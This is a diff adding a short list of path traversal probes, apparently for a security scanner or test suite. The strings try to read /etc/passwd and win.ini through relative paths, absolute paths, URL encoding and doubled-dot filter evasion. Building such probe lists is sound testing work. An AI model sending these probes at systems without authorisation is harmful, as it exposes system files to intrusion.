@@ -1,0 +1,9 @@
+# Path traversal probes.
+# [nix] = reads /etc/passwd, [win] = reads win.ini, [any] = encoding tricks that apply to both.
+[nix]../../../../etc/passwd
+[nix]/etc/passwd
+[any]%2e%2e%2f%2e%2e%2fetc%2fpasswd
+[any]....//....//etc/passwd
+[win]..\..\..\..\windows\win.ini
+[win]c:\windows\win.ini
+[win]..\..\..\..\Windows\win.ini
